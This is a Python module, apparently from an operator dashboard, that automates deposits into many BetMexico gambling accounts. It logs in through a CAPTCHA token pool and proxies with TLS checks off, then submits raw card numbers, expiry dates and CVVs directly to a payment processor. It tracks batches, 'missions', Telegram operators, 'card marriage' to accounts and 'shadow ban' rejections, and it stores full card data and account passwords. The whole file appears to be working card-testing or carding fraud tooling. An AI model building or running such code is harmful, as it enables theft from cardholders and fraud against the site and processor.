#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BetMexico Web Dashboard — Deposit Logic
Handles the complex flow of login -> BeginDeposit -> makePayment -> verify.
"""

import asyncio
import httpx
import json
import logging
import os
import time
import uuid
from typing import Optional
from betmexico_db import db
from betmexico_payment_analyzer import score_payment_readiness
from betmexico_login_api import (
    BetmexicoApiChecker, BETMEXICO_URLS,
    RECAPTCHA_V2_SITE_KEY
)
from betmexico_login_service import get_jwt
from web_utils import _friendly_error, _normalize_ccexp, _build_proxy_url

logger = logging.getLogger("betmexico.web.deposit")

BETMEXICO_PAYMENTS_API = "https://paymentsapi.betmexico.mx"
PROCESSORPAY_MAKE_PAYMENT_URL = "https://processorpay.com/sanval/api/IframeGames/makePayment"
NO_PROXY = os.getenv("BMX_NO_PROXY", "0") == "1"

async def _run_deposit(
    email: str,
    password: str,
    cc_num: str,
    cc_exp: str,
    cc_cvv: str,
    amount: float,
    user: dict,
    pool, # CaptchaTokenPool instance
    save_card: bool = True,
    check_marriage: bool = True,
    step_cb=None,
    # Audit params (aditivos, backward-compat: todos opcionales)
    card_id: Optional[int] = None,
    batch_id: Optional[str] = None,
    mission_id: Optional[str] = None,
    source: str = "dashboard_manual",
) -> dict:
    """Core de depósito reutilizable. Persiste cada intento en deposit_attempts."""
    attempt_id = uuid.uuid4().hex
    process_id = uuid.uuid4().hex
    operator_id = int(user.get("telegram_id") or 0)
    t_start = time.time()

    def _phase(phase: str, payload: Optional[dict] = None, t_phase: Optional[float] = None):
        try:
            duration_ms = int((time.time() - t_phase) * 1000) if t_phase else None
            db.log_process_phase(
                process_id, "deposit", phase,
                json.dumps(payload, ensure_ascii=False, default=str)[:2000] if payload else None,
                duration_ms,
            )
        except Exception:
            pass

    def _persist_final(result: dict, balance_before: Optional[float] = None):
        """Persiste el intento en deposit_attempts. SIEMPRE invocado al final."""
        try:
            if result.get("success"):
                status = "approved"
            elif result.get("result_code") in ("LOGIN_FAILED", "CAPTCHA_POOL_EMPTY"):
                status = "login_lost"
            elif result.get("result_code") in ("BEGIN_ERROR", "PAYMENT_ERROR"):
                status = "gateway_error"
            elif result.get("result_code") == "TIMEOUT":
                status = "timeout"
            else:
                status = "rejected"
            duration_ms = int((time.time() - t_start) * 1000)
            db.log_attempt(
                attempt_id=attempt_id,
                batch_id=batch_id,
                account_email=email,
                card_id=card_id,
                amount=float(amount),
                source=source,
                operator_id=operator_id,
                status=status,
                gateway_response_raw=json.dumps(result, ensure_ascii=False, default=str)[:4000],
                gateway_txn_id=result.get("txn_id"),
                balance_before=balance_before,
                balance_after=result.get("balance_real"),
                duration_ms=duration_ms,
                rejection_reason=result.get("result_code"),
                mission_id=mission_id,
            )
        except Exception as e:
            logger.error(f"[Deposit] Error persisting attempt: {e}")

    _phase("init", {"email": email, "amount": amount, "source": source,
                    "batch_id": batch_id, "mission_id": mission_id})
    # Pre-check de marriage
    if check_marriage and save_card:
        existing = await asyncio.to_thread(db.get_card_account, cc_num)
        if existing and (existing["account_email"] != email or existing["account_password"] != password):
            r = {"success": False, "result_code": "CARD_CONFLICT", "error": _friendly_error("CARD_CONFLICT")}
            _phase("error", {"reason": "CARD_CONFLICT"})
            _persist_final(r)
            return r

    if step_cb: step_cb("login", "start")
    admin_proxy_url = None if NO_PROXY else _build_proxy_url(db.get_admin_proxy() if hasattr(db, "get_admin_proxy") else None)
    
    # Fallback si db no tiene get_admin_proxy (api.py lo tiene vía import)
    if not admin_proxy_url and not NO_PROXY:
         from betmexico_config import get_admin_proxy
         admin_proxy_url = _build_proxy_url(get_admin_proxy())

    _phase("login_start", {"email": email})
    t_login = time.time()
    jwt, login_result = await get_jwt(email, password, pool, proxy=admin_proxy_url)
    if not jwt:
        _phase("error", {"reason": "LOGIN_FAILED"}, t_login)
        r = {"success": False, "result_code": "LOGIN_FAILED", "error": _friendly_error("LOGIN_FAILED")}
        _persist_final(r)
        return r
    _phase("login_ok", {"from_cache": login_result.get("from_cache", False)}, t_login)

    # Stats / Score update
    pre_balance_real = 0.0
    pre_balance_bonos = 0.0
    if login_result:
        try:
            acct_details = login_result.get("account_details", {})
            pre_balance_real = float(acct_details.get("balance_real", 0.0) or 0.0)
            pre_balance_bonos = float(acct_details.get("balance_bonos", 0.0) or 0.0)
            
            txns_data = acct_details.get("transactions", {})
            scoring = score_payment_readiness({
                "email": email, "account_details": acct_details, "transactions": txns_data,
            })
            login_result["payment_score"] = scoring
            await asyncio.to_thread(db.upsert_account, login_result, user.get("telegram_id", 0))
            txn_items = txns_data.get("items", [])
            if txn_items:
                await asyncio.to_thread(db.save_account_transactions, email, txn_items, user.get("telegram_id", 0))
        except Exception as e:
            logger.warning(f"[Deposit] Error actualizando BD con datos de login: {e}")

    if step_cb: step_cb("login", "ok")
    if step_cb: step_cb("deposit", "start")

    cc_exp_clean = _normalize_ccexp(cc_exp)

    async with httpx.AsyncClient(timeout=30.0, verify=False, proxy=admin_proxy_url) as client:
        # PASO 1 — BeginDepositWithCard
        try:
            r1 = await client.post(
                f"{BETMEXICO_PAYMENTS_API}/api/wallet/deposit/BeginDepositWithCard",
                json={"amount": f"{amount:.2f}", "theme": 1},
                headers={"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"},
            )
            d1 = r1.json()
        except Exception as e:
            logger.error(f"[Deposit] BeginDeposit error: {e}")
            _phase("error", {"reason": "BEGIN_ERROR", "detail": str(e)})
            r = {"success": False, "result_code": "BEGIN_ERROR", "error": _friendly_error("BEGIN_ERROR")}
            _persist_final(r, balance_before=pre_balance_real)
            return r

        if r1.status_code != 200:
            api_err = d1.get("error", "") if isinstance(d1, dict) else ""
            api_msg = d1.get("message", "") if isinstance(d1, dict) else ""
            if api_err == "AUTOEXCLUSION":
                rc = "AUTOEXCLUSION"
            elif "IsUserInValidationProcess" in api_msg or "DOES_NOT_COMPLY" in api_err:
                rc = "KYC_PENDING"
            else:
                rc = "BEGIN_ERROR"
            _phase("error", {"reason": rc, "status": r1.status_code})
            r = {"success": False, "result_code": rc, "error": _friendly_error(rc)}
            _persist_final(r, balance_before=pre_balance_real)
            return r

        order_id = d1.get("orderId")
        txn_id = d1.get("transactionId")
        if not order_id or not txn_id:
            logger.error(f"[Deposit] Missing orderId/txnId: {d1}")
            _phase("error", {"reason": "BEGIN_ERROR", "detail": "missing_order_or_txn"})
            r = {"success": False, "result_code": "BEGIN_ERROR", "error": "Error interno de plataforma"}
            _persist_final(r, balance_before=pre_balance_real)
            return r
        _phase("deposit_post", {"order_id": order_id, "txn_id": txn_id})

        # PASO 2 — makePayment (processorpay.com, sin auth)
        try:
            payload = {
                "orderId": order_id,
                "ccNumber": cc_num.replace(" ", ""),
                "ccExp": cc_exp_clean,
                "ccCvv": cc_cvv,
            }
            r2 = await client.post(
                PROCESSORPAY_MAKE_PAYMENT_URL,
                json=payload,
                headers={"Content-Type": "application/json"},
            )
            logger.info(f"[Deposit] makePayment status={r2.status_code} body={r2.text[:500]!r}")
            d2 = r2.json()
        except Exception as e:
            logger.error(f"[Deposit] makePayment error: {e}")
            _phase("error", {"reason": "PAYMENT_ERROR", "detail": str(e)})
            r = {"success": False, "result_code": "PAYMENT_ERROR", "error": _friendly_error("PAYMENT_ERROR"),
                 "order_id": order_id, "txn_id": txn_id}
            _persist_final(r, balance_before=pre_balance_real)
            return r
        _phase("deposit_resp", {"result_code": d2.get("resultCode")})

        result_code = d2.get("resultCode", "UNKNOWN")
        pay_payload = d2.get("payload") or {}
        is_3ds = (d2.get("threeDs", False) or pay_payload.get("threeDs", False) or pay_payload.get("redirectUrl") or d2.get("redirectUrl"))

        if is_3ds:
            # Guardar tarjeta ANTES de retornar (aunque sea 3DS, la tarjeta fue aceptada por el banco)
            if save_card:
                try:
                    await asyncio.to_thread(
                        db.register_card_to_account,
                        cc_num, cc_exp, cc_cvv,
                        email, password,
                        user.get("telegram_id", 0),
                        user.get("first_name", user.get("username", "web"))
                    )
                except Exception as e:
                    logger.warning(f"[Deposit] Fallo guardar tarjeta en 3DS: {e}")
            if step_cb: step_cb("deposit", "3DS_REQUIRED")
            r = {"success": False, "result_code": "3DS_REQUIRED", "error": _friendly_error("3DS_REQUIRED"), "order_id": order_id, "txn_id": txn_id}
            _phase("complete", {"result_code": "3DS_REQUIRED"})
            _persist_final(r, balance_before=pre_balance_real)
            return r

        approved = result_code == "BANK_APPROVED"
        
        # Verify transaction status
        txn_status = 0
        try:
            r3 = await client.get(
                f"{BETMEXICO_PAYMENTS_API}/api/wallet/bankTransaction/{txn_id}",
                headers={"Authorization": f"Bearer {jwt}"},
            )
            if r3.status_code == 200:
                txn_status = r3.json().get("transactionStatus", 0)
                if approved and txn_status == -4:
                    result_code = "BANK_REJECTED"
                    approved = False
        except Exception as e:
            logger.warning(f"[Deposit] bankTransaction verify error: {e}")

        # Robert: Shadow Ban Diagnosis
        if not approved and not is_3ds and amount >= 500 and result_code == "BANK_REJECTED":
            logger.warning(f"[Deposit] Shadow Ban suspicion for {email}: Direct reject on ${amount}")
            result_code = "SHADOW_BAN?"

        # Final Verification by Balance if needed (Ambiguous results)
        balance_real, balance_bonos = (0.0, 0.0)
        pre_ambiguous_code = result_code  # preservar para fallback
        if result_code not in ("BANK_APPROVED", "BANK_REJECTED", "3DS_REQUIRED"):
            logger.info(f"[Deposit] Ambiguous result ({result_code}) — checking balance fallback...")
            await asyncio.sleep(6)
            try:
                async with httpx.AsyncClient(timeout=10.0, verify=False, proxy=admin_proxy_url) as bal_client:
                    rb = await bal_client.get(
                        f"{BETMEXICO_PAYMENTS_API}/api/Wallet/Total/Amount/ByAccountType",
                        headers={"Authorization": f"Bearer {jwt}"},
                    )
                    if rb.status_code == 200:
                        bal_data = rb.json()
                        if isinstance(bal_data, list):
                            for item in bal_data:
                                acc_type = item.get("accountType", "")
                                val = float(item.get("totalAmount", 0.0) or 0.0)
                                if acc_type == "Real": balance_real = val
                                elif acc_type == "Bonos": balance_bonos = val
                        
                        if (balance_real + balance_bonos) >= (pre_balance_real + pre_balance_bonos) + (amount * 0.8):
                            logger.info(f"[Deposit] ✅ Confirmed by balance! (${pre_balance_real} -> ${balance_real})")
                            approved = True
                            result_code = "BANK_APPROVED"
                        else:
                            # Preservar SHADOW_BAN? si ese era el diagnóstico original
                            result_code = pre_ambiguous_code if pre_ambiguous_code == "SHADOW_BAN?" else "3DS_UNDETECTED"
            except Exception as e:
                logger.error(f"[Deposit] Balance verify failed: {e}")

        # Persistencia del resultado
        try:
            await asyncio.to_thread(
                db.record_deposit_result,
                email, password, cc_num, cc_exp_clean, cc_cvv,
                amount, result_code, user.get("telegram_id", 0),
            )
            if approved and save_card:
                await asyncio.to_thread(
                    db.register_card_to_account,
                    cc_num, cc_exp, cc_cvv,
                    email, password,
                    user.get("telegram_id", 0),
                    user.get("first_name", user.get("username", "web"))
                )
        except Exception as e:
            logger.error(f"[Deposit] DB error: {e}")

    # Polling real-time post-deposit (Profiling)
    if approved:
        try:
            await asyncio.sleep(2)
            async with httpx.AsyncClient(timeout=25.0, verify=False, proxy=admin_proxy_url) as poll_client:
                checker = BetmexicoApiChecker(client=poll_client)
                fresh = await checker.fetch_account_details_parallel(jwt)
                score_data = score_payment_readiness(fresh)
                
                # fullname/address vienen al TOP-LEVEL del dict (no anidados en
                # personal_details). Además: solo escribir si el fetch trajo dato
                # real — no pisar la BD con None/N/A si la API vino vacía.
                update_data = {
                    "balance_real": fresh.get("balance_real", 0.0),
                    "balance_bonos": fresh.get("balance_bonos", 0.0),
                    "balance_total": (fresh.get("balance_real", 0.0) or 0.0) + (fresh.get("balance_bonos", 0.0) or 0.0),
                }
                _fn = fresh.get("fullname")
                if _fn and _fn != "N/A":
                    update_data["fullname"] = _fn
                _addr = fresh.get("address")
                if _addr and _addr != "N/A":
                    update_data["address"] = _addr
                # last_deposit_*: solo persistir si la API trajo dato válido —
                # si fetch vino vacío, conservar el de BD (no pisar con 0/N/A).
                _ldamt = fresh.get("last_deposit_amount")
                _lddate = fresh.get("last_deposit_date")
                if (_ldamt is not None and float(_ldamt or 0) > 0
                        and _lddate and str(_lddate).strip() not in ("", "N/A")):
                    update_data["last_deposit_amount"] = float(_ldamt)
                    update_data["last_deposit_date"] = str(_lddate)
                if score_data:
                    update_data["grade"] = score_data["grade"]
                    update_data["grade_score"] = score_data["score"]
                await asyncio.to_thread(db.update_account_stats, email, password, **update_data)
        except: pass

    final_result = {
        "success": approved,
        "result_code": result_code,
        "order_id": order_id,
        "txn_id": txn_id,
        "txn_status": txn_status,
        "balance_real": balance_real,
        "balance_bonos": balance_bonos,
    }
    _phase("balance_post", {"balance_real": balance_real, "balance_bonos": balance_bonos, "approved": approved})
    _phase("complete", {"result_code": result_code, "approved": approved})
    _persist_final(final_result, balance_before=pre_balance_real)
    return final_result
